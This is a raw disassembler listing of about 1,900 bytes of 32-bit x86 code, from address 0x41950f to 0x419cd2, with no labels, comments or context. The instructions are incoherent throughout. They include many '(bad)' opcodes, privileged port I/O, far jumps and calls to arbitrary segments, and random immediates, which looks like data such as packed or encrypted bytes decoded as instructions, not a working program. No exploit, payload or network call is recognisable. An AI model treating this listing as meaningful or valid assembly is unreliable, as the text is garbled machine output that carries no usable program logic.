  41950f:	in     al,dx
  419510:	xchg   ebx,eax
  419511:	jecxz  0x4194ee
  419513:	jecxz  0x4194f9
  419515:	rol    edi,0xda
  419518:	mov    ah,0x4d
  41951a:	(bad)  
  41951b:	es inc eax
  41951d:	sbb    esp,DWORD PTR [edi]
  41951f:	addr16 enter 0x702f,0x2f
  419524:	dec    esp
  419525:	inc    esi
  419526:	rcr    DWORD PTR [edi],0x41
  419529:	int    0x1
  41952b:	and    BYTE PTR [ebx+eax*4-0x7ac0dabc],bl
  419532:	push   0xffffffd6
  419534:	inc    eax
  419535:	adc    bh,bl
  419537:	inc    ebp
  419538:	loope  0x4194c1
  41953a:	mov    esi,0x276b13bc
  41953f:	fs pop esp
  419541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419542:	xor    al,0xde
  419544:	pushf  
  419545:	adc    DWORD PTR [edi-0x7c],ecx
  419548:	mov    DWORD PTR [eax],ecx
  41954a:	or     eax,0xebbbd63d
  41954f:	pop    eax
  419550:	xor    al,0x99
  419552:	test   al,0xbd
  419554:	add    edi,esp
  419556:	ss pop edi
  419558:	loop   0x4195bb
  41955a:	adc    BYTE PTR [eax+0x55f4bd22],cl
  419560:	pop    ebx
  419561:	ds retf 0x1ec5
  419565:	clc    
  419566:	or     DWORD PTR [edi+0x4c],ebp
  419569:	fs es push cs
  41956c:	das    
  41956d:	mov    edx,0xb22a6fb2
  419572:	pop    edx
  419573:	add    cl,bl
  419575:	xor    al,0x2e
  419577:	out    0x5e,eax
  419579:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41957a:	add    ah,BYTE PTR [ebx]
  41957c:	push   esi
  41957d:	jns    0x41954d
  41957f:	xor    cl,BYTE PTR [eax+0x52]
  419582:	cmc    
  419583:	pop    es
  419584:	jge    0x4195ff
  419586:	jle    0x4195e7
  419588:	aam    0x63
  41958a:	fidivr DWORD PTR [edi]
  41958c:	jmp    0xfb77:0xbaf522fd
  419593:	ret    
  419594:	jb     0x41959c
  419596:	dec    ecx
  419597:	ja     0x4195fe
  419599:	and    ebp,DWORD PTR [ebx]
  41959b:	cmp    esp,DWORD PTR ds:0xf6156171
  4195a1:	mov    esi,ebp
  4195a3:	(bad)  
  4195a4:	shr    BYTE PTR [edx-0x34],1
  4195a7:	sbb    eax,0x37c4a4d3
  4195ac:	in     eax,dx
  4195ad:	jo     0x419561
  4195af:	seto   ch
  4195b2:	mov    ch,0x41
  4195b4:	ror    esp,1
  4195b6:	inc    esp
  4195b7:	cmp    edi,DWORD PTR [edx+0x7e]
  4195ba:	ins    DWORD PTR es:[edi],dx
  4195bb:	mov    ebx,0xbc54aa2d
  4195c0:	fst    DWORD PTR [ecx+0x50]
  4195c3:	inc    esi
  4195c4:	iret   
  4195c5:	inc    edi
  4195c6:	rcl    BYTE PTR [edx],0x4
  4195c9:	xor    al,0x33
  4195cb:	jbe    0x4195eb
  4195cd:	pop    ds
  4195ce:	ins    BYTE PTR es:[edi],dx
  4195cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195d0:	dec    ecx
  4195d1:	cmp    dh,BYTE PTR [edi-0x39d0f0fa]
  4195d7:	sahf   
  4195d8:	jg     0x419574
  4195da:	push   esi
  4195db:	test   DWORD PTR [eax],edx
  4195dd:	xor    esi,DWORD PTR [esi+0x64709d1d]
  4195e3:	pop    ecx
  4195e4:	cli    
  4195e5:	mov    edx,0xeb51119c
  4195ea:	mov    ch,0xa
  4195ec:	sub    ebx,DWORD PTR [ecx-0x51]
  4195ef:	xor    BYTE PTR [ebx],dl
  4195f1:	outs   dx,BYTE PTR ds:[esi]
  4195f2:	shl    DWORD PTR [esi-0x50347f9],0xa3
  4195f9:	dec    ebx
  4195fa:	fs push eax
  4195fc:	or     eax,0x637c8188
  419601:	mov    edi,0x383b12a9
  419606:	cmp    ah,ah
  419608:	inc    ebp
  419609:	add    ecx,DWORD PTR [edx+0x3938c6a1]
  41960f:	mov    dh,0x4
  419611:	loope  0x41967f
  419613:	arpl   bp,ax
  419615:	fdivr  st,st(7)
  419617:	sahf   
  419618:	fs (bad) 
  41961a:	cs push ebx
  41961c:	jno    0x4195c1
  41961e:	mov    ds:0x518d6625,al
  419623:	and    eax,0x7686ba62
  419628:	dec    edx
  419629:	adc    bl,BYTE PTR [esi-0x52a62339]
  41962f:	mov    gs:0x33cd8dea,al
  419635:	jmp    0x447978b7
  41963a:	cli    
  41963b:	jecxz  0x4195d9
  41963d:	pop    ds
  41963e:	mov    dh,ch
  419640:	sbb    DWORD PTR [edi],0x6b
  419643:	mov    fs,WORD PTR [edi+0x586ca28f]
  419649:	xor    bh,BYTE PTR [edi]
  41964b:	ffree  st(5)
  41964d:	inc    ecx
  41964e:	mov    bl,0x46
  419650:	cld    
  419651:	push   ecx
  419652:	xchg   BYTE PTR [edx+0x210b3c8f],cl
  419658:	inc    edi
  419659:	push   eax
  41965a:	mov    al,ds:0xaf08741d
  41965f:	sub    al,0xc7
  419661:	std    
  419662:	dec    ebx
  419663:	hlt    
  419664:	loop   0x419642
  419666:	pop    edx
  419667:	ret    0x32b5
  41966a:	cmp    al,0xae
  41966c:	jo     0x419645
  41966e:	imul   ebp,DWORD PTR [edi],0xc4b7c088
  419674:	daa    
  419675:	imul   DWORD PTR [eax+0x4f1fc1d7]
  41967b:	icebp  
  41967c:	rcr    DWORD PTR [eax+edx*1-0x3623c0af],0x4b
  419684:	js     0x41968b
  419686:	fucomi st,st(3)
  419688:	and    al,0xd6
  41968a:	mov    esi,0xf382c561
  41968f:	xor    edx,DWORD PTR [eax-0x30b47ac9]
  419695:	dec    ecx
  419696:	jo     0x4196e6
  419698:	fcmovne st,st(1)
  41969a:	out    0xf5,ax
  41969d:	adc    BYTE PTR [ebx-0x66294e6a],bh
  4196a3:	cwde   
  4196a4:	pop    ecx
  4196a5:	rcl    BYTE PTR [ebx-0x35],cl
  4196a8:	adc    dl,BYTE PTR [esi]
  4196aa:	dec    eax
  4196ab:	mov    eax,ds:0x4dc62f51
  4196b0:	or     al,0xe0
  4196b2:	lahf   
  4196b3:	ss jno 0x41968d
  4196b6:	add    al,0x5d
  4196b8:	nop
  4196b9:	add    al,BYTE PTR [ebp+0x165c2796]
  4196bf:	pop    edi
  4196c0:	jl     0x4196b2
  4196c2:	mov    al,ds:0x21f53615
  4196c7:	mov    ebx,0x3de31579
  4196cc:	xor    BYTE PTR [esi],bh
  4196ce:	sbb    BYTE PTR [edx-0x25],bh
  4196d1:	sti    
  4196d2:	hlt    
  4196d3:	retf   
  4196d4:	push   0x20
  4196d6:	mul    BYTE PTR [esi+ebx*4-0x30]
  4196da:	fcomp  QWORD PTR [esi]
  4196dc:	adc    DWORD PTR [edx-0x1c],0xfffffff8
  4196e0:	mov    dh,0x39
  4196e2:	xor    ch,cl
  4196e4:	mov    edi,0x6897988d
  4196e9:	fld    QWORD PTR [edi]
  4196eb:	cwde   
  4196ec:	punpcklbw mm7,DWORD PTR [ecx-0x5e]
  4196f0:	cmp    al,0x89
  4196f2:	test   al,0x2a
  4196f4:	mov    cl,0x3f
  4196f6:	push   ebx
  4196f7:	aaa    
  4196f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196f9:	hlt    
  4196fa:	sbb    dl,BYTE PTR [eax+0x3221a001]
  419700:	xchg   edx,eax
  419701:	hlt    
  419702:	jge    0x4196a1
  419704:	pop    ebp
  419705:	mov    cs,WORD PTR [edi-0x75eee3dc]
  41970b:	xor    al,0x49
  41970d:	data16 (bad) [edx+0x4c]
  419711:	repz imul ebp,DWORD PTR [ebx],0xaea18a2
  419718:	shl    dh,1
  41971a:	jle    0x41975b
  41971c:	inc    ecx
  41971d:	js     0x4196a7
  41971f:	cmc    
  419720:	popf   
  419721:	outs   dx,BYTE PTR ds:[esi]
  419722:	mov    dl,0x6
  419724:	pushf  
  419725:	xor    eax,0xcac06ed4
  41972a:	nop
  41972b:	dec    edi
  41972c:	fcomp  DWORD PTR [edx]
  41972e:	daa    
  41972f:	lock ds cwde 
  419732:	mov    eax,ds:0x993e718d
  419737:	sub    dl,BYTE PTR [edi-0x2d]
  41973a:	lahf   
  41973b:	mov    edx,0x82c8f3d4
  419740:	into   
  419741:	mov    ebx,0xbdcb248e
  419746:	mov    bl,0x41
  419748:	xchg   edi,eax
  419749:	push   0x2a269a5b
  41974e:	shr    DWORD PTR [edi+0xb],0x43
  419752:	(bad)  
  419753:	fcmove st,st(6)
  419755:	sbb    al,0x5e
  419757:	push   ebx
  419758:	out    0x7f,al
  41975a:	retf   0x2220
  41975d:	jmp    0xd1721a00
  419762:	fisubr WORD PTR [edi-0x7c93e1ba]
  419768:	cld    
  419769:	xchg   ecx,eax
  41976a:	xchg   edx,eax
  41976b:	popa   
  41976c:	cli    
  41976d:	cmp    BYTE PTR [edx+eiz*1+0x5a],dh
  419771:	ss mov ecx,0xb3f1693f
  419777:	stc    
  419778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419779:	cmc    
  41977a:	xor    bl,BYTE PTR [eax-0x488d8fea]
  419780:	sub    eax,0xdc4a23bd
  419785:	mov    ds:0x2d63851e,eax
  41978a:	leave  
  41978b:	add    edi,ebx
  41978d:	icebp  
  41978e:	addr16 cmp ebp,edi
  419791:	xor    edx,ebp
  419793:	dec    eax
  419794:	jb     0x41971c
  419796:	lock shl BYTE PTR [ebp+0x43],0xfc
  41979b:	inc    esi
  41979c:	(bad)  
  41979e:	mov    ebp,0x6cfe5af6
  4197a3:	jno    0x4197dc
  4197a5:	ins    BYTE PTR es:[edi],dx
  4197a6:	lods   al,BYTE PTR ds:[esi]
  4197a7:	jae    0x4197e4
  4197a9:	(bad)  
  4197aa:	fisub  DWORD PTR [ebx+0x73d0d7f1]
  4197b0:	cmc    
  4197b1:	iret   
  4197b2:	mov    ds:0x8178810a,eax
  4197b7:	inc    ebx
  4197b8:	aaa    
  4197b9:	mov    cl,0xda
  4197bb:	icebp  
  4197bc:	cmp    esp,DWORD PTR [eax-0x63b40ce5]
  4197c2:	jle    0x41983d
  4197c4:	iret   
  4197c5:	ret    
  4197c6:	and    al,0xa1
  4197c9:	pop    ds
  4197ca:	nop
  4197cb:	call   0x636c:0x2f62c36f
  4197d2:	adc    DWORD PTR [ebp-0x3c4723dc],0xbf0c294f
  4197dc:	mov    ecx,cs
  4197de:	loope  0x4197fe
  4197e0:	std    
  4197e1:	and    ch,BYTE PTR [esi]
  4197e3:	cmp    edi,DWORD PTR [edx-0x1208ca67]
  4197e9:	bound  ebp,QWORD PTR [edi]
  4197eb:	sahf   
  4197ec:	and    ebx,DWORD PTR [ecx-0x2b685c0b]
  4197f2:	repz fisubr WORD PTR [eax+0x646efc57]
  4197f9:	stc    
  4197fa:	cld    
  4197fb:	stos   DWORD PTR es:[edi],eax
  4197fc:	imul   edx,DWORD PTR [ebx+0x7f9769fa],0xfffffff8
  419803:	cmp    DWORD PTR fs:[bx+di-0x1a],edi
  419808:	xchg   DWORD PTR [ecx],esp
  41980a:	(bad)  
  41980b:	out    dx,al
  41980c:	pop    ds
  41980d:	(bad)  
  41980e:	popf   
  41980f:	mov    edx,DWORD PTR [esi+esi*1+0x18c3a30]
  419816:	mov    ch,0x67
  419818:	hlt    
  419819:	xor    dl,BYTE PTR [esi+0x512a236]
  41981f:	rol    DWORD PTR [ebp-0x14],1
  419822:	fldenv [ebx+ecx*1]
  419826:	loope  0x41987c
  419828:	or     cl,BYTE PTR [esi-0x62c593b8]
  41982e:	dec    edx
  41982f:	and    esp,eax
  419831:	and    BYTE PTR [ebp+0x16],0x2a
  419835:	test   BYTE PTR [edi],cl
  419837:	jae    0x419834
  419839:	adc    eax,0x1ad0d6b6
  41983e:	in     eax,0xf3
  419840:	stos   DWORD PTR es:[edi],eax
  419841:	add    DWORD PTR [eax-0x4c7dbdac],edx
  419847:	js     0x419894
  419849:	fsub   DWORD PTR [eax-0x3f]
  41984c:	cmc    
  41984d:	test   eax,0x837471a5
  419852:	push   ss
  419853:	(bad)  
  419854:	cmp    al,0xb8
  419856:	enter  0xf63f,0x8d
  41985a:	lock lods al,BYTE PTR ds:[esi]
  41985c:	pop    ecx
  41985d:	stos   DWORD PTR es:[edi],eax
  41985e:	add    edx,DWORD PTR [ecx]
  419860:	fdivr  QWORD PTR [ecx+0x16b32384]
  419866:	cdq    
  419867:	mov    eax,0x88e8b546
  41986c:	(bad)  
  41986d:	push   esp
  41986e:	jle    0x4198bb
  419870:	test   ecx,eax
  419872:	icebp  
  419873:	repz push 0x4e
  419876:	enter  0x7026,0x11
  41987a:	(bad)  
  41987b:	cli    
  41987c:	sti    
  41987d:	mov    al,0x2c
  41987f:	repz scas al,BYTE PTR es:[edi]
  419881:	cld    
  419882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419883:	add    esi,DWORD PTR [esi+0x59]
  419886:	or     cl,ah
  419888:	push   ebx
  419889:	mov    esp,0xde6ee02d
  41988e:	push   cs
  41988f:	jne    0x419849
  419891:	clc    
  419892:	popfw  
  419894:	inc    edi
  419895:	mov    WORD PTR [eax-0x2c],fs
  419898:	xor    al,0xee
  41989a:	inc    edi
  41989b:	add    DWORD PTR [edx+0x4f],0xffffff9b
  41989f:	cmp    ecx,DWORD PTR [esi+eiz*4]
  4198a2:	xor    ecx,DWORD PTR [eax+0x45]
  4198a5:	sbb    BYTE PTR [edi-0xb],dl
  4198a8:	jle    0x41985a
  4198aa:	push   esi
  4198ab:	cmc    
  4198ac:	js     0x4198cb
  4198ae:	outs   dx,BYTE PTR ds:[esi]
  4198af:	and    BYTE PTR [eax-0x27],ch
  4198b2:	pop    ds
  4198b3:	loop   0x419868
  4198b5:	stos   BYTE PTR es:[edi],al
  4198b6:	jle    0x419903
  4198b8:	push   ebx
  4198b9:	pop    edx
  4198ba:	pop    ebp
  4198bb:	iret   
  4198bc:	pop    ss
  4198bd:	adc    al,0x30
  4198bf:	mov    dl,0x8a
  4198c1:	inc    esi
  4198c2:	outs   dx,DWORD PTR ds:[esi]
  4198c3:	mov    ebp,0x8d181525
  4198c8:	or     al,0xeb
  4198ca:	test   eax,0xa0c69ecb
  4198cf:	mov    WORD PTR [ebx+eax*4],cs
  4198d2:	retf   
  4198d3:	ficomp DWORD PTR [ebp+0x5e]
  4198d6:	mov    eax,ds:0xdb3d2c96
  4198db:	inc    ebx
  4198dc:	mov    cl,0xaf
  4198df:	hlt    
  4198e0:	outs   dx,BYTE PTR ds:[esi]
  4198e1:	inc    esp
  4198e2:	(bad)  
  4198e3:	or     ah,al
  4198e5:	mov    BYTE PTR [edx+0x355866e7],dl
  4198eb:	call   0x9305:0xb59ce630
  4198f2:	inc    ecx
  4198f3:	dec    edi
  4198f4:	(bad)  
  4198f5:	pop    ss
  4198f6:	in     al,dx
  4198f7:	sbb    BYTE PTR [ebx-0x3bfc7dad],al
  4198fd:	shr    DWORD PTR [eax-0x15],0x4
  419901:	sbb    edx,eax
  419903:	cmp    ebp,DWORD PTR [eax+0x61a73cea]
  419909:	push   esi
  41990a:	pop    ds
  41990b:	push   edx
  41990c:	xchg   ebp,eax
  41990d:	retf   0xee1c
  419910:	shr    BYTE PTR [eax-0x56],0xc1
  419914:	test   BYTE PTR [ebp+eiz*4-0x610fcb2e],cl
  41991b:	push   esp
  41991c:	dec    edx
  41991d:	jnp    0x419958
  41991f:	std    
  419920:	test   BYTE PTR ds:0x6bcc43c0,0xba
  419927:	sahf   
  419928:	test   al,0xf
  41992a:	stos   DWORD PTR es:[edi],eax
  41992b:	mov    ecx,0x24f21ce1
  419930:	sub    al,0x45
  419932:	dec    ecx
  419933:	jno    0x4198d6
  419935:	and    bh,BYTE PTR gs:[ecx]
  419938:	adc    ebx,DWORD PTR [ecx-0x419cf98c]
  41993e:	enter  0x6a08,0x80
  419942:	pop    es
  419943:	pop    ds
  419944:	sbb    ah,al
  419946:	outs   dx,DWORD PTR ds:[esi]
  419947:	js     0x4198e0
  419949:	hlt    
  41994a:	adc    eax,DWORD PTR [ecx-0x56]
  41994d:	lods   al,BYTE PTR ds:[esi]
  41994e:	pop    ds
  41994f:	mul    DWORD PTR [edx+0x3f9be25b]
  419955:	bound  ebp,QWORD PTR [edi+0x7b52f61c]
  41995b:	dec    edi
  41995c:	dec    edx
  41995d:	jns    0x4199a0
  41995f:	in     al,dx
  419960:	add    al,0xe4
  419962:	pop    esi
  419963:	xchg   edx,eax
  419964:	fwait
  419965:	jp     0x4199d9
  419967:	xchg   ebx,eax
  419968:	aad    0xf3
  41996a:	inc    esi
  41996b:	jb     0x4198f9
  41996d:	cld    
  41996e:	and    eax,DWORD PTR [edi]
  419970:	cmp    al,BYTE PTR [esi]
  419972:	pop    ds
  419973:	pop    ebp
  419974:	outs   dx,DWORD PTR ds:[esi]
  419975:	mov    ch,0x41
  419977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419978:	stos   DWORD PTR es:[edi],eax
  419979:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41997a:	test   al,0xa6
  41997c:	push   0xffffff92
  41997e:	fld    TBYTE PTR [edx]
  419980:	outs   dx,BYTE PTR ds:[esi]
  419981:	fidivr DWORD PTR [edi+0x1135d5c0]
  419987:	cmc    
  419988:	sbb    cl,bh
  41998a:	push   ebx
  41998b:	push   esi
  41998c:	fcomp  QWORD PTR [esi-0x2d662d0c]
  419992:	lods   eax,DWORD PTR ds:[esi]
  419993:	mov    bl,dl
  419995:	mov    esi,0xd75f4a46
  41999a:	sbb    DWORD PTR [esi+0x38d13011],ebp
  4199a0:	jmp    0x73d:0xb1d069e1
  4199a7:	aad    0x8b
  4199a9:	sbb    al,0xe0
  4199ab:	daa    
  4199ac:	and    al,0xb2
  4199ae:	loope  0x419941
  4199b0:	ins    BYTE PTR es:[edi],dx
  4199b1:	mov    ebx,DWORD PTR [bx+si-0x69]
  4199b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199b6:	jle    0x4199cc
  4199b8:	out    dx,eax
  4199b9:	push   ds
  4199ba:	cld    
  4199bb:	std    
  4199bc:	jg     0x419a00
  4199be:	enter  0xfee3,0x3a
  4199c2:	sbb    BYTE PTR ds:0x9445b843,al
  4199c8:	stc    
  4199c9:	call   0x516a:0x433fce1e
  4199d0:	jne    0x419a1e
  4199d2:	lds    esi,FWORD PTR [edi-0x58]
  4199d5:	jecxz  0x4199b6
  4199d7:	adc    al,ah
  4199d9:	jecxz  0x419997
  4199db:	sub    al,0xdc
  4199dd:	dec    ebp
  4199de:	mov    eax,ds:0xf5e7d883
  4199e3:	adc    ebx,DWORD PTR [eax+0x2647f0be]
  4199e9:	rcr    cl,0xc8
  4199ec:	scas   al,BYTE PTR es:[edi]
  4199ed:	sbb    BYTE PTR [eax+0x295bfbf2],ah
  4199f3:	dec    ecx
  4199f4:	dec    ebp
  4199f5:	adc    BYTE PTR [edx+0x21],cl
  4199f8:	cmp    eax,0x52c6ad2
  4199fd:	jno    0x4199df
  4199ff:	xchg   esp,eax
  419a00:	dec    esi
  419a01:	push   0xffffffe0
  419a03:	std    
  419a04:	pop    ds
  419a05:	mov    al,0xf6
  419a07:	icebp  
  419a08:	fwait
  419a09:	shr    BYTE PTR [eax-0x1b],0x52
  419a0d:	sub    al,0x73
  419a0f:	sahf   
  419a10:	mov    al,ds:0xb5aa2a82
  419a15:	jmp    0x4199a3
  419a17:	sahf   
  419a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a19:	aad    0xef
  419a1b:	cmp    BYTE PTR [ecx-0x53],ah
  419a1e:	jle    0x419a22
  419a20:	sub    BYTE PTR [edx-0x1fabe1a3],0xe2
  419a27:	mov    ch,0x62
  419a29:	fisttp DWORD PTR [ecx+0x76]
  419a2c:	inc    eax
  419a2d:	sahf   
  419a2e:	retf   
  419a2f:	cs inc ebp
  419a31:	dec    esp
  419a32:	cmp    eax,0x4ddec886
  419a37:	inc    esp
  419a38:	xor    eax,0xfeaca222
  419a3d:	and    eax,0xc0bdc055
  419a42:	stos   DWORD PTR es:[edi],eax
  419a43:	out    dx,al
  419a44:	mov    edi,0x24c6c31a
  419a49:	fs push es
  419a4b:	mov    WORD PTR [edx-0x4a02ae8a],es
  419a51:	iret   
  419a52:	cmp    esp,ebp
  419a54:	inc    esp
  419a55:	pop    edx
  419a56:	daa    
  419a57:	xchg   esi,eax
  419a58:	jb     0x419a33
  419a5a:	ror    BYTE PTR [edx-0x26],cl
  419a5d:	xchg   ebp,eax
  419a5e:	sbb    BYTE PTR [ecx+0x7b729e4b],ch
  419a64:	pushf  
  419a65:	fidiv  WORD PTR [ecx+eiz*1+0x2d8b18a2]
  419a6c:	mov    edx,0x3177cbd7
  419a71:	fdiv   st(1),st
  419a73:	mov    ecx,0xfcd2acdb
  419a78:	jbe    0x419ab0
  419a7a:	or     DWORD PTR [ebx+eiz*2],0x4c
  419a7e:	xor    dh,ch
  419a80:	jbe    0x419a5a
  419a82:	jp     0x419ae0
  419a84:	iret   
  419a85:	xchg   ecx,eax
  419a86:	mov    ebx,0x5030c31d
  419a8b:	popa   
  419a8c:	bound  ebp,QWORD PTR ds:[edx-0xe99b461]
  419a93:	mov    esp,0x8dab8198
  419a98:	call   0x830e047f
  419a9d:	dec    esi
  419a9e:	inc    esp
  419a9f:	cdq    
  419aa0:	lds    eax,FWORD PTR [edi]
  419aa2:	sub    ebp,DWORD PTR [ecx]
  419aa4:	xchg   edx,eax
  419aa5:	inc    bx
  419aa7:	xor    edx,DWORD PTR [esp+edi*1-0x76]
  419aab:	or     ebx,edi
  419aad:	mov    esi,0xd08ba8e9
  419ab2:	popf   
  419ab3:	out    0xab,eax
  419ab5:	sbb    al,0x79
  419ab7:	rol    DWORD PTR [esi],0x4d
  419aba:	push   edx
  419abb:	out    0x50,eax
  419abd:	xor    al,0x95
  419abf:	and    BYTE PTR ds:0xf345ea28,ch
  419ac5:	xchg   BYTE PTR gs:[ecx+edi*1-0x4e8de46e],dh
  419acd:	mov    eax,0x8aa16908
  419ad2:	xchg   ecx,eax
  419ad3:	daa    
  419ad4:	cdq    
  419ad5:	outs   dx,BYTE PTR ds:[esi]
  419ad6:	and    BYTE PTR [esi-0x5c],dh
  419ad9:	cmp    BYTE PTR [ecx+0x145f4226],bh
  419adf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ae0:	jb     0x419af0
  419ae2:	xor    eax,0x92c2f975
  419ae7:	sub    DWORD PTR [eax+0x3fa302a8],ebp
  419aed:	in     eax,0x1d
  419aef:	rcr    bh,1
  419af1:	pop    ecx
  419af2:	mov    cl,0xe2
  419af4:	dec    esp
  419af5:	outs   dx,BYTE PTR ds:[esi]
  419af6:	call   0x4f123a02
  419afb:	outs   dx,BYTE PTR ds:[esi]
  419afc:	sub    eax,0x69bc95e0
  419b01:	cs mov esp,0xc382ec4
  419b07:	mov    edx,0xab5466cc
  419b0c:	sbb    bh,bl
  419b0e:	adc    eax,0x6c9329bf
  419b13:	mov    eax,ds
  419b15:	(bad)  
  419b17:	pop    ss
  419b18:	xchg   edx,eax
  419b19:	xor    dl,ah
  419b1b:	fsubr  QWORD PTR [ecx]
  419b1d:	fs pop ecx
  419b1f:	lahf   
  419b20:	push   ecx
  419b21:	xchg   edx,eax
  419b22:	dec    esi
  419b23:	jle    0x419af5
  419b25:	mov    al,ds:0x3ca75895
  419b2a:	xchg   ecx,eax
  419b2b:	add    al,0xa
  419b2d:	adc    al,0xb
  419b2f:	dec    esi
  419b30:	add    BYTE PTR [ecx+0x6e],0xa2
  419b34:	sbb    eax,0xd359e7b1
  419b39:	cmp    DWORD PTR [ebx+0x19],ebp
  419b3c:	pop    edi
  419b3d:	fwait
  419b3e:	pop    edx
  419b3f:	sbb    edi,ebx
  419b41:	push   es
  419b42:	sub    dh,BYTE PTR [edi]
  419b44:	jns    0x419b81
  419b46:	push   eax
  419b47:	add    eax,0x7c4b8425
  419b4c:	push   es
  419b4d:	xchg   BYTE PTR [edi],bl
  419b4f:	mov    ebp,0x40842d52
  419b54:	jne    0x419b96
  419b56:	outs   dx,DWORD PTR ds:[esi]
  419b57:	add    eax,0x281d8a5
  419b5c:	cs jp  0x419b3b
  419b5f:	sahf   
  419b60:	mov    ecx,0x1e608fc4
  419b65:	mov    ?,ecx
  419b67:	mov    esi,0xfdf1a7cf
  419b6c:	retf   0x8fff
  419b6f:	je     0x419bcf
  419b71:	rol    BYTE PTR [edi-0x395fecd8],1
  419b77:	dec    esi
  419b78:	mov    ebx,0xb767d446
  419b7d:	lea    ecx,ds:0x6f9b2763
  419b83:	xchg   edx,eax
  419b84:	fist   WORD PTR [edi]
  419b86:	lahf   
  419b87:	ins    DWORD PTR es:[edi],dx
  419b88:	or     DWORD PTR [ecx+0x6b],edi
  419b8b:	mov    dl,0xf1
  419b8d:	jge    0x419bfe
  419b8f:	retf   
  419b90:	inc    ebp
  419b91:	jl     0x419ba7
  419b93:	test   BYTE PTR cs:[edi+0x24],ah
  419b97:	add    DWORD PTR [edi-0x47934082],eax
  419b9d:	mov    esp,0xf54e7698
  419ba2:	jmp    0x316b602c
  419ba7:	test   eax,0xc35021a2
  419bac:	addr16 pushf 
  419bae:	dec    ecx
  419baf:	adc    eax,0x6af98c5d
  419bb4:	loop   0x419b46
  419bb6:	jle    0x419b93
  419bb8:	push   esp
  419bb9:	push   esi
  419bba:	add    al,0xa5
  419bbc:	jl     0x419b7e
  419bbe:	call   0x462c:0x879b79c6
  419bc5:	pop    edi
  419bc6:	xchg   dx,ax
  419bc8:	jge    0x419bf4
  419bca:	adc    dl,BYTE PTR [eax+0x1d]
  419bcd:	js     0x419b90
  419bcf:	push   eax
  419bd0:	dec    edi
  419bd1:	sbb    al,0x83
  419bd3:	fisub  DWORD PTR [ebx]
  419bd5:	jbe    0x419baa
  419bd7:	pop    eax
  419bd8:	test   DWORD PTR [esi-0xc847d4a],0xc9d9da07
  419be2:	cdq    
  419be3:	xor    DWORD PTR [eax+0xa],esi
  419be6:	push   0x69
  419be8:	pop    es
  419be9:	fdivr  DWORD PTR [edi+edi*8+0x6d]
  419bed:	cmp    DWORD PTR [ebx],eax
  419bef:	imul   edx,DWORD PTR ds:0xa6b13058,0xffffffff
  419bf6:	hlt    
  419bf7:	sub    DWORD PTR [edx-0x38],esi
  419bfa:	mov    eax,edi
  419bfc:	imul   edx,DWORD PTR [edi+eiz*1-0x2b],0x1581ae43
  419c04:	in     al,0xa2
  419c06:	call   0xa5d93ce3
  419c0b:	mov    ebp,esi
  419c0d:	sub    bl,dh
  419c0f:	push   ebp
  419c10:	sbb    eax,0xbc5fbcc4
  419c15:	in     eax,dx
  419c16:	sub    DWORD PTR [ebx],ebp
  419c18:	and    al,ah
  419c1a:	out    0x7f,ax
  419c1d:	push   ds
  419c1e:	in     al,0xfa
  419c20:	cwde   
  419c21:	cmp    eax,0x7a95261a
  419c26:	inc    ecx
  419c27:	or     esp,DWORD PTR [esi-0x52]
  419c2a:	ss inc edi
  419c2c:	inc    eax
  419c2d:	ret    0xff67
  419c30:	mov    al,0x5f
  419c32:	dec    ecx
  419c33:	iret   
  419c34:	cmp    al,BYTE PTR [esi+0x4389cf00]
  419c3a:	xlat   BYTE PTR ds:[ebx]
  419c3b:	xchg   ebp,eax
  419c3c:	(bad)  
  419c3d:	std    
  419c3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c3f:	repz xor DWORD PTR [esi],0xbda8c1e0
  419c46:	and    eax,DWORD PTR [ecx-0x2a]
  419c49:	pop    ebp
  419c4a:	mov    al,0x6
  419c4c:	xchg   DWORD PTR [edx],ebp
  419c4e:	imul   edx,ebx,0xffffff91
  419c51:	push   ebp
  419c52:	shl    BYTE PTR [edx+0x8],0x9
  419c56:	(bad)  
  419c57:	jmp    0xaae9:0xd36b8a14
  419c5e:	or     ecx,DWORD PTR [ecx-0x3ca1832d]
  419c64:	add    DWORD PTR [ebp-0x79],0xfbc5a2d0
  419c6b:	jmp    0x419ce2
  419c6d:	ja     0x419bf8
  419c6f:	test   BYTE PTR [eax],ah
  419c71:	aas    
  419c72:	adc    ebx,DWORD PTR [eax]
  419c74:	push   edx
  419c75:	aas    
  419c76:	pop    edx
  419c77:	scas   eax,DWORD PTR es:[edi]
  419c78:	mov    DWORD PTR ds:0xb03d22c7,edx
  419c7e:	inc    eax
  419c7f:	inc    eax
  419c80:	and    ebp,esi
  419c82:	add    edx,DWORD PTR [ecx-0x7]
  419c85:	aad    0x93
  419c87:	sahf   
  419c88:	jo     0x419c4a
  419c8a:	adc    BYTE PTR [eax+0x33691302],0x1e
  419c91:	das    
  419c92:	stos   BYTE PTR es:[edi],al
  419c93:	stos   DWORD PTR es:[edi],eax
  419c94:	pop    ebx
  419c95:	add    bl,al
  419c97:	xor    dl,BYTE PTR [ebx+0x4f]
  419c9a:	mov    ecx,fs
  419c9c:	push   edi
  419c9d:	push   ebp
  419c9e:	xor    BYTE PTR [ecx],bh
  419ca0:	push   esp
  419ca1:	sub    eax,0x2b7af3c1
  419ca6:	inc    ecx
  419ca7:	pop    ebx
  419ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ca9:	inc    eax
  419caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cab:	pop    edx
  419cac:	adc    eax,0x1177debc
  419cb1:	sbb    BYTE PTR [esp+edi*1+0x536d8bc3],bh
  419cb8:	and    al,0xb7
  419cba:	mov    dh,0xe8
  419cbc:	mov    al,0x3e
  419cbe:	fld    QWORD PTR cs:0x2e7505da
  419cc5:	sbb    eax,0x8089eae7
  419cca:	xchg   edx,eax
  419ccb:	or     eax,0xc6b8baf0
  419cd0:	idiv   edi
  419cd2:	(bad)  
